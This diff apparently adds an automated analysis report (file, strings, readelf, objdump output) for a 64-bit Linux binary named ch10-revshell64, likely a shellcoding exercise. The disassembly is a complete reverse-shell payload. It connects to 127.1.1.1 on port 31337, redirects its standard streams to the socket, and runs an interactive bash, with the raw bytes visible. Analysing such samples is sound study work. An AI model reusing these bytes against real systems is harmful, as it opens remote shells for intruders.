@@ -1,0 +1,139 @@
+*** FILE TYPE INFORMATION ***
+
+ch10-revshell64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
+
+
+*** STRINGS INFORMATION ***
+
+////bashSH  |  /////binSH  |  Pfh-iH  |  PVWH  |  ch10-revshell64.nasm  |  __bss_start  |  _edata  |  _end  |  .symtab  |  .strtab  |  .shstrtab  |  .text  |  
+
+*** READELF ALL ***
+
+ELF Header:
+  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
+  Class:                             ELF64
+  Data:                              2's complement, little endian
+  Version:                           1 (current)
+  OS/ABI:                            UNIX - System V
+  ABI Version:                       0
+  Type:                              EXEC (Executable file)
+  Machine:                           Advanced Micro Devices X86-64
+  Version:                           0x1
+  Entry point address:               0x400080
+  Start of program headers:          64 (bytes into file)
+  Start of section headers:          544 (bytes into file)
+  Flags:                             0x0
+  Size of this header:               64 (bytes)
+  Size of program headers:           56 (bytes)
+  Number of program headers:         1
+  Size of section headers:           64 (bytes)
+  Number of section headers:         5
+  Section header string table index: 2
+
+Section Headers:
+  [Nr] Name              Type            Address          Off    Size   ES Flg Lk Inf Al
+  [ 0]                   NULL            0000000000000000 000000 000000 00      0   0  0
+  [ 1] .text             PROGBITS        0000000000400080 000080 0000a1 00  AX  0   0 16
+  [ 2] .shstrtab         STRTAB          0000000000000000 0001fe 000021 00      0   0  1
+  [ 3] .symtab           SYMTAB          0000000000000000 000128 0000a8 18      4   3  8
+  [ 4] .strtab           STRTAB          0000000000000000 0001d0 00002e 00      0   0  1
+Key to Flags:
+  W (write), A (alloc), X (execute), M (merge), S (strings), l (large)
+  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
+  O (extra OS processing required) o (OS specific), p (processor specific)
+
+There are no section groups in this file.
+
+Program Headers:
+  Type           Offset   VirtAddr           PhysAddr           FileSiz  MemSiz   Flg Align
+  LOAD           0x000000 0x0000000000400000 0x0000000000400000 0x000121 0x000121 R E 0x200000
+
+ Section to Segment mapping:
+  Segment Sections...
+   00     .text 
+
+There is no dynamic section in this file.
+
+There are no relocations in this file.
+
+The decoding of unwind sections for machine type Advanced Micro Devices X86-64 is not currently supported.
+
+Symbol table '.symtab' contains 7 entries:
+   Num:    Value          Size Type    Bind   Vis      Ndx Name
+     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
+     1: 0000000000400080     0 SECTION LOCAL  DEFAULT    1 
+     2: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS ch10-revshell64.nasm
+     3: 0000000000400080     0 NOTYPE  GLOBAL DEFAULT    1 _start
+     4: 0000000000600121     0 NOTYPE  GLOBAL DEFAULT    1 __bss_start
+     5: 0000000000600121     0 NOTYPE  GLOBAL DEFAULT    1 _edata
+     6: 0000000000600128     0 NOTYPE  GLOBAL DEFAULT    1 _end
+
+No version information found in this file.
+
+
+*** OBJDUMP EXECUTABLE ***
+
+
+ch10-revshell64:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000400080 <_start>:
+  400080:	48 31 c0             	xor    rax,rax
+  400083:	b0 29                	mov    al,0x29
+  400085:	48 31 ff             	xor    rdi,rdi
+  400088:	40 80 c7 02          	add    dil,0x2
+  40008c:	48 31 f6             	xor    rsi,rsi
+  40008f:	48 83 c6 01          	add    rsi,0x1
+  400093:	48 31 d2             	xor    rdx,rdx
+  400096:	0f 05                	syscall 
+  400098:	48 89 c7             	mov    rdi,rax
+  40009b:	48 31 c0             	xor    rax,rax
+  40009e:	50                   	push   rax
+  40009f:	c7 44 24 fc 7f 01 01 	mov    DWORD PTR [rsp-0x4],0x101017f
+  4000a6:	01 
+  4000a7:	66 c7 44 24 fa 7a 69 	mov    WORD PTR [rsp-0x6],0x697a
+  4000ae:	89 44 24 f6          	mov    DWORD PTR [rsp-0xa],eax
+  4000b2:	c6 44 24 f8 02       	mov    BYTE PTR [rsp-0x8],0x2
+  4000b7:	48 83 ec 08          	sub    rsp,0x8
+  4000bb:	48 31 c0             	xor    rax,rax
+  4000be:	b0 2a                	mov    al,0x2a
+  4000c0:	48 89 e6             	mov    rsi,rsp
+  4000c3:	48 31 d2             	xor    rdx,rdx
+  4000c6:	48 83 c2 10          	add    rdx,0x10
+  4000ca:	0f 05                	syscall 
+  4000cc:	48 31 c0             	xor    rax,rax
+  4000cf:	b0 21                	mov    al,0x21
+  4000d1:	48 31 f6             	xor    rsi,rsi
+  4000d4:	0f 05                	syscall 
+  4000d6:	48 31 c0             	xor    rax,rax
+  4000d9:	b0 21                	mov    al,0x21
+  4000db:	48 ff c6             	inc    rsi
+  4000de:	0f 05                	syscall 
+  4000e0:	48 31 c0             	xor    rax,rax
+  4000e3:	b0 21                	mov    al,0x21
+  4000e5:	48 ff c6             	inc    rsi
+  4000e8:	0f 05                	syscall 
+  4000ea:	48 31 c0             	xor    rax,rax
+  4000ed:	50                   	push   rax
+  4000ee:	48 31 db             	xor    rbx,rbx
+  4000f1:	48 bb 2f 2f 2f 2f 62 	movabs rbx,0x687361622f2f2f2f
+  4000f8:	61 73 68 
+  4000fb:	53                   	push   rbx
+  4000fc:	48 bb 2f 2f 2f 2f 2f 	movabs rbx,0x6e69622f2f2f2f2f
+  400103:	62 69 6e 
+  400106:	53                   	push   rbx
+  400107:	48 89 e7             	mov    rdi,rsp
+  40010a:	50                   	push   rax
+  40010b:	66 68 2d 69          	pushw  0x692d
+  40010f:	48 89 e6             	mov    rsi,rsp
+  400112:	50                   	push   rax
+  400113:	56                   	push   rsi
+  400114:	57                   	push   rdi
+  400115:	48 89 e6             	mov    rsi,rsp
+  400118:	48 31 d2             	xor    rdx,rdx
+  40011b:	48 83 c0 3b          	add    rax,0x3b
+  40011f:	0f 05                	syscall 
+
+
